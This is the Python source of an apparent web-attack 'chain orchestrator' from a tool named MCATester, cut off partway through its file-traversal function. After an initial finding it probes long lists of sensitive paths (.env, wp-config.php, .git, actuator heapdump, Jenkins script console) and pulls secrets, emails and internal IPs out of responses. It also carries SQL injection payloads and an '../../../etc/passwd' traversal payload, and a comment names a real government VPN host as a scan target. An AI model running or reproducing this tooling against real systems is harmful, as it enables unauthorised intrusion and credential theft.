#!/usr/bin/env python3
"""
MCATester - orchestrator.py
Attack Chain Orchestrator — makes the scanner "curious".

When a finding is confirmed mid-scan, this module:
1. Matches it against a trigger table
2. Fires targeted follow-up probes immediately
3. New findings from follow-ups feed back into the orchestrator
4. Chains until max_depth (default 3) or no new triggers fire

Result: one phpinfo.php finding becomes .env + config.php + API keys.

Integration (2 lines in osint_agent.py):
    from orchestrator import Orchestrator
    orchestrated = Orchestrator(target, enriched_ports, recon["technologies"]).run(all_findings, http_get)
    all_findings += orchestrated
"""

import re
import time
import requests
import urllib3
from urllib.parse import urljoin, urlparse
from typing import Callable

urllib3.disable_warnings()

# ─────────────────────────────────────────────
# TRIGGER TABLE
# pattern_key → follow-up paths to probe
# Each entry: (path, severity_if_found, reason)
# ─────────────────────────────────────────────

TRIGGER_CHAINS = {

    # ── PHP / Generic ─────────────────────────────────────────────────────────
    "phpinfo": [
        ("/.env",                    "CRITICAL", "Env file common on PHP apps"),
        ("/config.php",              "CRITICAL", "PHP config often contains DB creds"),
        ("/db.php",                  "CRITICAL", "Database connection file"),
        ("/database.php",            "CRITICAL", "Database connection file"),
        ("/wp-config.php",           "CRITICAL", "WordPress config"),
        ("/configuration.php",       "CRITICAL", "Joomla config"),
        ("/config/database.php",     "HIGH",     "Laravel/CodeIgniter DB config"),
        ("/app/config/parameters.yml","HIGH",    "Symfony config"),
        ("/includes/config.php",     "HIGH",     "Common PHP config path"),
        ("/settings.php",            "HIGH",     "Drupal settings"),
        ("/local.xml",               "HIGH",     "Magento config"),
    ],

    # ── Environment files ─────────────────────────────────────────────────────
    "env_exposed": [
        ("/.env.backup",             "CRITICAL", "Backup env file"),
        ("/.env.local",              "CRITICAL", "Local override env"),
        ("/.env.production",         "CRITICAL", "Production env"),
        ("/.env.staging",            "HIGH",     "Staging env"),
        ("/.env.example",            "MEDIUM",   "Example env — reveals variable names"),
        ("/env.txt",                 "HIGH",     "Alternative env location"),
    ],

    # ── Git exposure ──────────────────────────────────────────────────────────
    "git_exposed": [
        ("/.git/COMMIT_EDITMSG",     "HIGH",     "Last commit message — reveals activity"),
        ("/.git/logs/HEAD",          "HIGH",     "Full commit history"),
        ("/.git/config",             "HIGH",     "Git config — remote URLs"),
        ("/.git/refs/heads/main",    "HIGH",     "Main branch ref"),
        ("/.git/refs/heads/master",  "HIGH",     "Master branch ref"),
        ("/.gitignore",              "MEDIUM",   "Reveals project structure"),
        ("/.github/workflows/",      "MEDIUM",   "CI/CD pipeline config"),
    ],

    # ── Swagger / OpenAPI ─────────────────────────────────────────────────────
    "swagger": [
        ("/api/v1/users",            "HIGH",     "User enumeration endpoint"),
        ("/api/v1/admin",            "HIGH",     "Admin API endpoint"),
        ("/api/v1/user",             "HIGH",     "User data endpoint"),
        ("/api/v2/users",            "HIGH",     "V2 user endpoint"),
        ("/api/v1/",                 "MEDIUM",   "API root"),
        ("/api/v2/",                 "MEDIUM",   "API v2 root"),
        ("/api/swagger.json",        "MEDIUM",   "Swagger spec"),
        ("/api/openapi.json",        "MEDIUM",   "OpenAPI spec"),
        ("/v1/api-docs",             "MEDIUM",   "API docs"),
        ("/swagger/v2/api-docs",     "MEDIUM",   "Swagger v2 docs"),
        ("/api/v1/health",           "LOW",      "Health endpoint — version disclosure"),
        ("/api/v1/version",          "LOW",      "Version endpoint"),
    ],

    # ── WordPress ─────────────────────────────────────────────────────────────
    "wp_login": [
        ("/wp-json/wp/v2/users",     "HIGH",     "WP REST API user enumeration"),
        ("/wp-content/debug.log",    "HIGH",     "WP debug log — may contain creds"),
        ("/wp-content/uploads/",     "MEDIUM",   "Uploads directory listing"),
        ("/wp-includes/",            "MEDIUM",   "WP includes directory"),
        ("/wp-cron.php",             "MEDIUM",   "WP cron — SSRF potential"),
        ("/xmlrpc.php",              "HIGH",     "XML-RPC — brute force vector"),
        ("/?author=1",               "MEDIUM",   "Author enumeration via redirect"),
        ("/wp-json/wp/v2/posts",     "LOW",      "Public posts — intel"),
    ],

    # ── Tomcat ────────────────────────────────────────────────────────────────
    "tomcat_manager": [
        ("/manager/text/list",       "CRITICAL", "Tomcat manager text API"),
        ("/manager/jmxproxy/",       "CRITICAL", "JMX proxy endpoint"),
        ("/host-manager/text/list",  "CRITICAL", "Host manager text API"),
        ("/manager/status",          "HIGH",     "Tomcat status page"),
        ("/manager/status/all",      "HIGH",     "Full status with thread dump"),
        ("/examples/servlets/",      "MEDIUM",   "Example servlets — old vulns"),
        ("/examples/jsp/",           "MEDIUM",   "Example JSPs"),
    ],

    # ── Spring Boot Actuator ──────────────────────────────────────────────────
    "actuator": [
        ("/actuator/env",            "CRITICAL", "Full environment dump"),
        ("/actuator/heapdump",       "CRITICAL", "JVM heap dump — contains secrets"),
        ("/actuator/dump",           "HIGH",     "Thread dump"),
        ("/actuator/trace",          "HIGH",     "HTTP request trace"),
        ("/actuator/mappings",       "HIGH",     "All URL mappings"),
        ("/actuator/beans",          "MEDIUM",   "Spring beans — architecture intel"),
        ("/actuator/metrics",        "MEDIUM",   "Application metrics"),
        ("/actuator/info",           "LOW",      "App info — version disclosure"),
        ("/actuator/health",         "LOW",      "Health check"),
    ],

    # ── Laravel ───────────────────────────────────────────────────────────────
    "laravel": [
        ("/.env",                    "CRITICAL", "Laravel env — DB/API keys"),
        ("/storage/logs/laravel.log","HIGH",     "Laravel log — stack traces"),
        ("/telescope",               "HIGH",     "Laravel Telescope — request history"),
        ("/horizon",                 "HIGH",     "Laravel Horizon — queue monitor"),
        ("/storage/app/",            "MEDIUM",   "Storage directory"),
        ("/bootstrap/cache/",        "MEDIUM",   "Bootstrap cache"),
        ("/_debugbar/",              "MEDIUM",   "Debug bar — dev only"),
    ],

    # ── Django ────────────────────────────────────────────────────────────────
    "django": [
        ("/admin/",                  "HIGH",     "Django admin panel"),
        ("/static/admin/",           "MEDIUM",   "Django static admin"),
        ("/__debug__/",              "HIGH",     "Django debug toolbar"),
        ("/api/schema/",             "MEDIUM",   "DRF schema endpoint"),
        ("/api/docs/",               "MEDIUM",   "DRF docs"),
    ],

    # ── Node / Express ────────────────────────────────────────────────────────
    "nodejs": [
        ("/node_modules/",           "HIGH",     "Node modules exposed"),
        ("/.npmrc",                  "CRITICAL", "NPM config — may have auth tokens"),
        ("/package.json",            "MEDIUM",   "Package.json — dependency intel"),
        ("/package-lock.json",       "MEDIUM",   "Lock file — full dep tree"),
        ("/.nvmrc",                  "LOW",      "Node version file"),
    ],

    # ── Backup files ─────────────────────────────────────────────────────────
    "backup_found": [
        ("/backup2.zip",             "CRITICAL", "Second backup file"),
        ("/db_backup.sql",           "CRITICAL", "Database backup"),
        ("/database.sql",            "CRITICAL", "Database dump"),
        ("/dump.sql",                "CRITICAL", "SQL dump"),
        ("/backup.tar.gz",           "CRITICAL", "Compressed backup"),
        ("/site.zip",                "CRITICAL", "Full site backup"),
        ("/old/",                    "HIGH",     "Old site directory"),
        ("/archive/",                "HIGH",     "Archive directory"),
        ("/bak/",                    "HIGH",     "Bak directory"),
    ],

    # ── SQL error / injection ─────────────────────────────────────────────────
    "sql_error": [
        # These are tested as param injections on the triggering URL, not paths
        # Handled specially in _probe_sqli_followup()
    ],

    # ── Version disclosure ────────────────────────────────────────────────────
    "version_disclosure": [
        ("/CHANGELOG",               "MEDIUM",   "Changelog — exact version"),
        ("/CHANGELOG.md",            "MEDIUM",   "Changelog markdown"),
        ("/VERSION",                 "MEDIUM",   "Version file"),
        ("/readme.txt",              "MEDIUM",   "Readme — version info"),
        ("/README.md",               "LOW",      "Readme"),
        ("/INSTALL.txt",             "LOW",      "Install instructions"),
        ("/LICENSE.txt",             "LOW",      "License — version intel"),
    ],

    # ── Admin panels ──────────────────────────────────────────────────────────
    "admin_panel": [
        ("/admin/config",            "HIGH",     "Admin config endpoint"),
        ("/admin/users",             "HIGH",     "Admin user management"),
        ("/admin/logs",              "HIGH",     "Admin log viewer"),
        ("/admin/backup",            "CRITICAL", "Admin backup function"),
        ("/admin/shell",             "CRITICAL", "Admin shell access"),
        ("/admin/phpinfo",           "HIGH",     "Admin phpinfo"),
        ("/admin/setup",             "HIGH",     "Admin setup page"),
    ],

    # ── Exposed config files ──────────────────────────────────────────────────
    "config_exposed": [
        ("/config.yml",              "HIGH",     "YAML config"),
        ("/config.yaml",             "HIGH",     "YAML config"),
        ("/config.json",             "HIGH",     "JSON config"),
        ("/settings.json",           "HIGH",     "Settings JSON"),
        ("/app.config",              "HIGH",     "App config"),
        ("/web.config.bak",          "HIGH",     "IIS config backup"),
        ("/application.properties",  "HIGH",     "Java app properties"),
        ("/application.yml",         "HIGH",     "Spring Boot config"),
        ("/secrets.yml",             "CRITICAL", "Secrets file"),
        ("/credentials.json",        "CRITICAL", "Credentials file"),
    ],

    # ── File path traversal APIs ─────────────────────────────────────────────
    "file_api": [
        # When a get-file-by-path or similar endpoint is found,
        # probe for directory traversal payloads
        # These are added as path-like entries but handled specially
    ],

    # ── VPN / Remote access ───────────────────────────────────────────────────
    "vpn_exposed": [
        ("/remote/login",            "HIGH",     "VPN login portal exposed"),
        ("/remote/logout",           "MEDIUM",   "VPN logout endpoint"),
        ("/remote/",                 "HIGH",     "VPN remote access root"),
        ("/dana-na/auth/url_default/welcome.cgi", "HIGH", "Juniper VPN"),
        ("/+CSCOE+/logon.html",      "HIGH",     "Cisco AnyConnect VPN"),
        ("/vpn/index.html",          "HIGH",     "Generic VPN portal"),
        ("/sslvpn/Login/Login",      "HIGH",     "SonicWall VPN"),
    ],

    # ── Webmail ───────────────────────────────────────────────────────────────
    "webmail_exposed": [
        ("/owa/",                    "HIGH",     "Outlook Web Access"),
        ("/exchange/",               "HIGH",     "Exchange Web Services"),
        ("/mail/",                   "MEDIUM",   "Generic webmail"),
        ("/gw/webaccess/",           "HIGH",     "GroupWise webmail"),
        ("/zimbra/",                 "HIGH",     "Zimbra webmail"),
        ("/roundcube/",              "HIGH",     "Roundcube webmail"),
        ("/autodiscover/autodiscover.xml", "MEDIUM", "Exchange autodiscover"),
    ],

    # ── Lotus Notes / Domino ─────────────────────────────────────────────────
    "lotus_domino": [
        ("/names.nsf",               "CRITICAL", "Domino directory — user enumeration"),
        ("/admin4.nsf",              "CRITICAL", "Domino admin database"),
        ("/webadmin.nsf",            "CRITICAL", "Domino web admin"),
        ("/log.nsf",                 "HIGH",     "Domino log database"),
        ("/domcfg.nsf",              "HIGH",     "Domino config database"),
        ("/catalog.nsf",             "HIGH",     "Domino catalog"),
        ("/mail.box",                "HIGH",     "Domino mail box"),
    ],

    # ── Jenkins / CI ──────────────────────────────────────────────────────────
    "jenkins": [
        ("/jenkins/script",          "CRITICAL", "Jenkins script console — RCE"),
        ("/script",                  "CRITICAL", "Jenkins script console"),
        ("/job/",                    "HIGH",     "Jenkins jobs list"),
        ("/credentials/",            "CRITICAL", "Jenkins credentials"),
        ("/manage",                  "HIGH",     "Jenkins management"),
        ("/api/json?pretty=true",    "MEDIUM",   "Jenkins API"),
    ],

    # ── Kubernetes / Docker ───────────────────────────────────────────────────
    "kubernetes": [
        ("/api/v1/namespaces",       "CRITICAL", "K8s API — namespace list"),
        ("/api/v1/pods",             "CRITICAL", "K8s API — pod list"),
        ("/healthz",                 "MEDIUM",   "K8s health endpoint"),
        ("/metrics",                 "MEDIUM",   "K8s metrics"),
    ],
}

# ─────────────────────────────────────────────
# PATTERN MATCHING
# Maps finding signals → trigger keys
# ─────────────────────────────────────────────

TRIGGER_PATTERNS = {
    "phpinfo":          [r"phpinfo", r"php\.ini", r"PHP Version"],
    "env_exposed":      [r"\.env", r"APP_KEY", r"DB_PASSWORD", r"DATABASE_URL"],
    "git_exposed":      [r"\.git", r"COMMIT_EDITMSG", r"git config"],
    "swagger":          [r"swagger", r"openapi", r"api-docs", r"swagger\.json",
                         r"swagger/index\.html", r"properties\.json"],
    "wp_login":         [r"wp-login", r"wp-admin", r"wordpress", r"xmlrpc\.php"],
    "tomcat_manager":   [r"manager/html", r"tomcat", r"Apache Tomcat", r"catalina"],
    "actuator":         [r"actuator", r"spring", r"heapdump"],
    "laravel":          [r"laravel", r"artisan", r"telescope", r"horizon"],
    "django":           [r"django", r"Django", r"__debug__"],
    "nodejs":           [r"node_modules", r"package\.json", r"express", r"node\.js"],
    "backup_found":     [r"\.zip$", r"\.tar\.gz$", r"\.sql$", r"backup", r"dump"],
    "sql_error":        [r"SQL syntax", r"mysql_fetch", r"ORA-\d+",
                         r"pg_query", r"sqlite_", r"Unclosed quotation"],
    "version_disclosure":[r"Server:", r"X-Powered-By:", r"Apache/\d", r"nginx/\d",
                          r"PHP/\d", r"version\s*[:=]\s*[\d\.]"],
    "admin_panel":      [r"/admin/", r"admin panel", r"administration"],
    "config_exposed":   [r"config\.php", r"\.yml$", r"\.yaml$", r"\.json$",
                         r"application\.properties"],
    "jenkins":          [r"jenkins", r"Hudson", r"Jenkins"],
    "kubernetes":       [r"kubernetes", r"kubectl", r"k8s", r"/api/v1/"],
    "file_api":         [r"get-file-by-path", r"getfile", r"file[?]path", r"cdn[?]path",
                         r"download[?]path", r"getdocument", r"file-download"],
    "vpn_exposed":      [r"vpn", r"remote/login", r"remote_login", r"sslvpn",
                         r"CSCOE", r"juniper", r"fortinet", r"forticlient"],
    "webmail_exposed":  [r"webmail", r"webaccess", r"/owa/", r"/zimbra/",
                         r"roundcube", r"groupwise", r"gw/webaccess"],
    "lotus_domino":     [r"[.]nsf", r"domino", r"lotus", r"names[.]nsf",
                         r"mail[.]box", r"webadmin[.]nsf"],
}

# ─────────────────────────────────────────────
# SQL INJECTION FOLLOW-UP PAYLOADS
# For sql_error trigger — tested on the same URL
# ─────────────────────────────────────────────

SQLI_FOLLOWUP_PAYLOADS = [
    ("'",                    "Quote — basic error check"),
    ("1 OR 1=1--",           "OR 1=1 — auth bypass"),
    ("1 UNION SELECT NULL--","UNION — column count probe"),
    ("1 AND SLEEP(3)--",     "Time-based blind SQLi"),
    ("' OR '1'='1",          "Classic OR injection"),
]


# ─────────────────────────────────────────────
# ORCHESTRATOR
# ─────────────────────────────────────────────

class Orchestrator:
    def __init__(self,
                 target: str,
                 open_ports: list,
                 technologies: list,
                 max_depth: int = 3,
                 max_new_findings: int = 50,
                 timeout: tuple = (5, 10)):
        self.target        = target
        self.open_ports    = open_ports
        self.technologies  = technologies
        self.max_depth     = max_depth
        self.max_new       = max_new_findings
        self.timeout       = timeout
        self.triggered     = set()   # avoid re-firing same chain
        self.probed_urls          = set()   # avoid re-probing same URL
        self.new_findings         = []
        self.tested_file_api_bases = set()  # dedup file_api by base endpoint

        # Build base URLs from open ports
        self.base_urls = self._build_base_urls()
        # Catch-all baseline hashes — detect apps that return 200 for everything
        self._catchall_hashes = {}   # base_url -> set of content hashes for canary 404s
        self._confirmed_paths = set()  # paths confirmed on at least one base — skip others

    def _build_base_urls(self) -> list:
        bases = []
        scheme_map = {80:"http", 443:"https", 8080:"http",
                      8443:"https", 8000:"http", 3000:"http"}
        for port in (self.open_ports or [80, 443]):
            scheme = scheme_map.get(port, "http")
            if port in (80, 443):
                bases.append(f"{scheme}://{self.target}")
            else:
                bases.append(f"{scheme}://{self.target}:{port}")
        if not bases:
            bases = [f"https://{self.target}", f"http://{self.target}"]
        return list(dict.fromkeys(bases))  # dedup, preserve order

    def _detect_catchall(self, base_url: str) -> dict:
        """
        Probe two random nonexistent paths to build a catch-all profile.
        Returns dict: {status_code: content_hash} for each canary response.

        Handles both 200 catch-alls (SPA apps) and 403 catch-alls
        (servers that blanket-403 everything unknown).
        """
        if base_url in self._catchall_hashes:
            return self._catchall_hashes[base_url]

        import hashlib
        canary_paths = [
            "/this-path-does-not-exist-canary-mcatester-abc123",
            "/another-fake-path-canary-xyz789-mcatester",
        ]
        # profile: maps (status, content_hash) tuples from canary responses
        profile = {}
        for path in canary_paths:
            try:
                # Use short timeout for canary — if it hangs, skip this base
                import requests, urllib3
                urllib3.disable_warnings()
                r = requests.get(
                    base_url + path,
                    headers={"User-Agent": "Mozilla/5.0 (compatible; MCATester/4.0)"},
                    timeout=(3, 5),   # short: 3s connect, 5s read
                    verify=False,
                    allow_redirects=True,
                )
                h = hashlib.md5(r.text[:500].encode()).hexdigest()
                profile[path] = (r.status_code, h)
            except Exception:
                # Timeout or connection error — mark base as unreachable
                profile[path] = (-1, "unreachable")

        self._catchall_hashes[base_url] = profile
        return profile

    def _is_catchall_response(self, base_url: str, status: int, content: str) -> bool:
        """
        Check if a response matches the catch-all profile for this base URL.
        Returns True if the response is indistinguishable from a canary response.
        """
        import hashlib
        profile = self._catchall_hashes.get(base_url, {})
        if not profile:
            return False

        resp_hash = hashlib.md5(content[:500].encode()).hexdigest()

        # Check if this response matches ANY canary response at the same status
        for path, (canary_status, canary_hash) in profile.items():
            if canary_status == status and canary_hash == resp_hash:
                return True

        # Also check if ALL canaries returned the same status+hash
        # (blanket catch-all — every path gets identical response)
        canary_signatures = set(profile.values())
        if len(canary_signatures) == 1:
            canary_status, canary_hash = list(canary_signatures)[0]
            if canary_status == status and canary_hash == resp_hash:
                return True

        return False

    # ── Main entry point ───────────────────────────────────────────────────

    def run(self, initial_findings: list, http_get_fn: Callable = None) -> list:
        """
        Process all confirmed findings and fire attack chains.

        Args:
            initial_findings: list of confirmed finding dicts from the pipeline
            http_get_fn:      the http_get function from osint_agent.py (optional)
                              if None, uses internal requests.get

        Returns:
            list of NEW findings discovered through chaining
            (do not re-include initial_findings — caller handles dedup)
        """
        print(f"\n{'─'*55}")
        print(f"  ATTACK CHAIN ORCHESTRATOR")
        print(f"{'─'*55}")
        print(f"  Processing {len(initial_findings)} findings for chain triggers...")
        print(f"  Base URLs: {self.base_urls}")
        print(f"  Max depth: {self.max_depth} | Max new findings: {self.max_new}")

        self._http_get = http_get_fn or self._default_http_get

        # Seed probed_urls with everything already found
        for f in initial_findings:
            if f.get("url"):
                self.probed_urls.add(f["url"])

        # Process initial findings at depth 0
        queue = [(f, 0) for f in initial_findings if f.get("confirmed")]
        total_chains_fired = 0

        while queue and len(self.new_findings) < self.max_new:
            finding, depth = queue.pop(0)

            if depth >= self.max_depth:
                continue

            # Find matching trigger chains for this finding
            chains = self._match_chains(finding)

            for chain_key, paths in chains:
                if chain_key in self.triggered:
                    continue

                self.triggered.add(chain_key)
                total_chains_fired += 1
                print(f"\n  [Chain] '{chain_key}' triggered by: {finding.get('url','?')[:60]}")
                print(f"  [Chain] Probing {len(paths)} follow-up paths at depth {depth+1}...")

                # Probe all paths in this chain
                chain_findings = self._probe_chain(
                    paths       = paths,
                    trigger_key = chain_key,
                    trigger_url = finding.get("url", ""),
                    depth       = depth + 1,
                )

                print(f"  [Chain] '{chain_key}' → {len(chain_findings)} new findings")

                # Add new findings and queue them for further chaining
                for new_f in chain_findings:
                    self.new_findings.append(new_f)
                    queue.append((new_f, depth + 1))

            # Special case: SQL error triggers param-level probes
            if self._matches_pattern(finding, "sql_error"):
                sqli_findings = self._probe_sqli_followup(finding, depth + 1)
                for f in sqli_findings:
                    self.new_findings.append(f)

            # Special case: file API endpoints trigger traversal probes
            # Deduplicate by base URL — don't probe same endpoint multiple times
            if self._matches_pattern(finding, "file_api"):
                base_url = finding.get("url", "").split("?")[0]
                if base_url not in self.tested_file_api_bases:
                    self.tested_file_api_bases.add(base_url)
                    trav_findings = self._probe_file_traversal(finding, depth + 1)
                    for f in trav_findings:
                        self.new_findings.append(f)
                        queue.append((f, depth + 1))
                else:
                    pass  # skip — already tested this endpoint

        print(f"\n  [Orchestrator] Complete:")
        print(f"  [Orchestrator] Chains fired   : {total_chains_fired}")
        print(f"  [Orchestrator] New findings   : {len(self.new_findings)}")

        if self.new_findings:
            by_sev = {}
            for f in self.new_findings:
                s = f.get("severity", "INFO")
                by_sev[s] = by_sev.get(s, 0) + 1
            for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
                if by_sev.get(sev):
                    print(f"  [Orchestrator]   {sev:<10}: {by_sev[sev]}")

        return self.new_findings

    # ── Chain matching ─────────────────────────────────────────────────────

    def _match_chains(self, finding: dict) -> list:
        """Return list of (chain_key, paths) that match this finding."""
        url     = finding.get("url", "").lower()
        vtype   = finding.get("vuln_type", "").lower()
        summary = finding.get("summary", "").lower()
        excerpt = finding.get("excerpt", finding.get("evidence", {}) or "")
        if isinstance(excerpt, dict):
            excerpt = str(excerpt)
        excerpt = excerpt.lower()

        # Combine all text signals
        text = f"{url} {vtype} {summary} {excerpt}"

        matched = []
        for key, patterns in TRIGGER_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, text, re.IGNORECASE):
                    paths = TRIGGER_CHAINS.get(key, [])
                    if paths:  # only add if chain has paths
                        matched.append((key, paths))
                    break  # one match per key is enough

        return matched

    def _matches_pattern(self, finding: dict, key: str) -> bool:
        """Check if a finding matches a specific pattern key."""
        patterns = TRIGGER_PATTERNS.get(key, [])
        text = " ".join([
            finding.get("url", ""),
            finding.get("vuln_type", ""),
            finding.get("summary", ""),
            str(finding.get("evidence", "")),
        ]).lower()
        return any(re.search(p, text, re.IGNORECASE) for p in patterns)

    # ── HTTP probing ───────────────────────────────────────────────────────

    def _probe_chain(self, paths: list, trigger_key: str,
                     trigger_url: str, depth: int) -> list:
        """
        Probe all paths in a chain using the TRIGGER URL's host — not the
        global self.base_urls.

        Root cause of the false findings bug:
          trigger: vpnv3.mca.gov.in:4111/remote/login
          old behavior: probed mca.gov.in/db_backup.sql  ← WRONG
          new behavior: probes vpnv3.mca.gov.in:4111/db_backup.sql ← CORRECT

        Falls back to self.base_urls only when trigger_url is a dork seed
        (source=dork_seed) without a real host.
        """
        from urllib.parse import urlparse
        findings = []

        # Derive base URL from trigger URL's actual host
        trigger_bases = []
        if trigger_url:
            try:
                p = urlparse(trigger_url)
                if p.hostname:
                    if p.port and p.port not in (80, 443):
                        trigger_bases.append(f"{p.scheme}://{p.hostname}:{p.port}")
                    else:
                        trigger_bases.append(f"{p.scheme}://{p.hostname}")
                    # Also add the other scheme if standard port
                    if not p.port or p.port in (80, 443):
                        other = "https" if p.scheme == "http" else "http"
                        trigger_bases.append(f"{other}://{p.hostname}")
            except Exception:
                pass

        # Only fall back to self.base_urls if we couldn't extract from trigger
        probe_bases = trigger_bases if trigger_bases else self.base_urls
        probe_bases = list(dict.fromkeys(probe_bases))  # dedup

        for base_url in probe_bases:
            # Detect catch-all and reachability before probing this base
            profile = self._detect_catchall(base_url)
            # Skip unreachable bases (all canaries timed out)
            if profile and all(s == -1 for s, _ in profile.values()):
                print(f"    [skip] {base_url} — unreachable (timeout)")
                continue

            for path, expected_sev, reason in paths:
                # Skip path if already confirmed on another base URL
                if path in self._confirmed_paths:
                    continue

                full_url = base_url.rstrip("/") + path
                if full_url in self.probed_urls:
                    continue
                self.probed_urls.add(full_url)

                result = self._probe_url(
                    full_url, expected_sev, reason,
                    trigger_key, trigger_url, depth,
                )
                if result:
                    findings.append(result)
                    self._confirmed_paths.add(path)
                    print(f"    [{result['severity']}] {path} → HTTP {result['status']}")

        return findings

    def _probe_url(self, url: str, expected_sev: str, reason: str,
                   trigger_key: str, trigger_url: str, depth: int) -> dict | None:
        """Probe a single URL and return a finding if confirmed."""
        import hashlib
        try:
            resp = self._http_get(url)
            if not resp:
                return None

            status  = resp.get("status", 0)  if isinstance(resp, dict) else getattr(resp, "status_code", 0)
            content = resp.get("text", "")   if isinstance(resp, dict) else getattr(resp, "text", "")

            # Only confirmed if 200 — 403 means path is blocked, not a finding
            if status not in (200, 206, 301, 302):
                return None

            # Catch-all check — if response matches canary, it's not a real finding
            # Handles 200 catch-alls (SPA apps returning 200 for all paths)
            base_url_key = url.split("/")[0] + "//" + url.split("/")[2]
            if self._is_catchall_response(base_url_key, status, content):
                return None

            # Determine actual severity
            severity = self._assess_severity(url, status, content, expected_sev, trigger_key)
            if not severity:
                return None

            # Extract useful evidence
            evidence = self._extract_evidence(content, url)

            vuln_type = self._vuln_type(url, status, trigger_key)

            return {
                "url":           url,
                "severity":      severity,
                "vuln_type":     vuln_type,
                "status":        status,
                "confirmed":     True,
                "source":        "orchestrated",
                "trigger":       trigger_key,
                "trigger_url":   trigger_url,
                "chain_depth":   depth,
                "reason":        reason,
                "summary":       f"{vuln_type} — found via attack chain from {trigger_key}",
                "evidence":      evidence,
                "category":      "Attack Chain",
            }

        except Exception:
            return None

    # Content signals that CONFIRM a path is genuinely what it claims to be
    CONTENT_CONFIRM = {
        "admin_panel": [
            "admin", "dashboard", "management", "settings", "configuration",
            "users", "logs", "backup", "shell", "console", "phpinfo",
        ],
        "phpinfo":     ["php version", "phpinfo()", "php core", "configuration file"],
        "env_exposed": ["app_key", "db_password", "database_url", "aws_access",
                        "secret_key", "api_key", "mail_password"],
        "git_exposed": ["ref:", "commit", "branch", "HEAD", "object", "tree"],
        "swagger":     ["swagger", "openapi", "paths", "components", "info"],
        "backup_found":["pk", "insert into", "create table", "compressed", "zip"],
        "actuator":    ["spring", "beans", "mappings", "env", "heapdump"],
        "jenkins":     ["jenkins", "hudson", "build", "job", "workspace"],
        "laravel":     ["laravel", "illuminate", "artisan", "eloquent"],
        "django":      ["django", "csrf", "wsgi", "settings", "debug"],
        "nodejs":      ["node_modules", "dependencies", "devdependencies", "scripts"],
    }

    def _assess_severity(self, url: str, status: int,
                          content: str, expected_sev: str,
                          trigger_key: str = "") -> str | None:
        """
        Refine severity based on actual response content.

        For CRITICAL paths (admin/shell, admin/backup etc): require content
        confirmation signals before reporting. This prevents catch-all apps
        that return 200 for everything from generating false positives.
        """
        # 403 should never reach here — filtered above
        # but just in case, return None to prevent false findings
        if status == 403:
            return None
        if False:  # dead code — kept for reference only
            downgrade = {"CRITICAL": "HIGH", "HIGH": "MEDIUM",
                         "MEDIUM": "LOW", "LOW": None}
            return downgrade.get(expected_sev)

        # Redirects — report as LOW only
        if status in (301, 302):
            return "LOW"

        if status == 200:
            # Reject empty or trivially small responses
            if len(content) < 30:
                return None

            content_lower = content.lower()

            # Reject obvious custom 404 pages
            false_positive_signals = [
                "page not found", "404 not found", "does not exist",
                "no page found", "error 404", "couldn't find",
                "the page you requested", "we couldn't find",
            ]
            if any(sig in content_lower[:800] for sig in false_positive_signals):
                return None

            # For CRITICAL expected severity: require content confirmation
            # This prevents admin/shell returning CRITICAL just because it's 200
            if expected_sev == "CRITICAL":
                critical_content = [
                    "db_password", "app_key", "secret_key", "api_key",
                    "aws_access", "private_key", "mysql_pass", "database_url",
                    "password=", "passwd=", "token=", "BEGIN RSA",
                    "insert into", "create table",  # SQL dumps
                    "ref: refs/",                    # Git
                ]
                if any(sig in content_lower for sig in critical_content):
                    return "CRITICAL"
                # No confirming content found — downgrade to HIGH
                # (path exists and returned 200 but not confirmed sensitive)
                return "HIGH"

            # For HIGH: require at least some domain-relevant content
            if expected_sev == "HIGH" and trigger_key:
                confirm_signals = self.CONTENT_CONFIRM.get(trigger_key, [])
                if confirm_signals:
                    has_signal = any(sig in content_lower for sig in confirm_signals)
                    if not has_signal:
                        # 200 but content doesn't match — likely catch-all
                        # Still report but downgrade to MEDIUM
                        return "MEDIUM"

            return expected_sev

        return None

    def _vuln_type(self, url: str, status: int, trigger_key: str) -> str:
        """Generate human-readable vuln type string."""
        path = urlparse(url).path
        if status == 403:
            return None  # 403 never a finding
        type_map = {
            "phpinfo":          "PHP configuration exposed",
            "env_exposed":      "Environment file accessible",
            "git_exposed":      "Git repository exposed",
            "swagger":          "API endpoint exposed",
            "wp_login":         "WordPress endpoint exposed",
            "tomcat_manager":   "Tomcat management endpoint exposed",
            "actuator":         "Spring Boot actuator endpoint exposed",
            "laravel":          "Laravel internal path accessible",
            "backup_found":     "Backup/archive file accessible",
            "sql_error":        "SQL injection parameter confirmed",
            "admin_panel":      "Admin panel endpoint accessible",
            "config_exposed":   "Configuration file accessible",
            "jenkins":          "Jenkins endpoint exposed",
            "kubernetes":       "Kubernetes API endpoint exposed",
        }
        base = type_map.get(trigger_key, "Sensitive path accessible")
        return f"{base}: {path}"

    def _extract_evidence(self, content: str, url: str) -> dict:
        """Extract high-value signals from response content."""
        evidence = {}
        if not content:
            return evidence

        # API keys and secrets
        secrets = re.findall(
            r'(?:api[_-]?key|secret|password|token|aws_access|private_key)'
            r'\s*[=:]\s*["\']?([A-Za-z0-9+/\-_]{8,})["\']?',
            content, re.IGNORECASE
        )
        if secrets:
            evidence["secrets_found"] = secrets[:5]

        # Email addresses
        emails = re.findall(r'[\w.+-]+@[\w-]+\.[a-zA-Z]{2,}', content)
        if emails:
            evidence["email_list"] = list(set(emails))[:10]

        # Internal IPs
        ips = re.findall(r'\b(?:10\.\d+|172\.(?:1[6-9]|2\d|3[01])|192\.168)\.\d+\.\d+\b', content)
        if ips:
            evidence["internal_ips"] = list(set(ips))[:5]

        # Tech version strings
        versions = re.findall(
            r'(?:version|v)\s*[=:"]?\s*(\d+\.\d+[\.\d]*)',
            content, re.IGNORECASE
        )
        if versions:
            evidence["versions"] = list(set(versions))[:5]

        # Database names
        db_names = re.findall(
            r'(?:DB_DATABASE|database|dbname)\s*[=:]\s*["\']?(\w+)["\']?',
            content, re.IGNORECASE
        )
        if db_names:
            evidence["db_names"] = list(set(db_names))[:3]

        return evidence

    # ── File path traversal follow-up ─────────────────────────────────────

    def _probe_file_traversal(self, finding: dict, depth: int) -> list:
        """
        For file-serving API endpoints (get-file-by-path, cdn?path etc),
        probe with directory traversal payloads to find sensitive files.
        """
        if depth > self.max_depth:
            return []

        trigger_url = finding.get("url", "")
        if not trigger_url:
            return []

        # Extract the base API endpoint
        base = trigger_url.split("?")[0]

        # Traversal payloads targeting common sensitive files
        TRAVERSAL_PAYLOADS = [
            ("../../../etc/passwd",          "CRITICAL", "Linux passwd file"),
            ("../../../windows/win.ini", "CRITICAL", "Windows system file"),
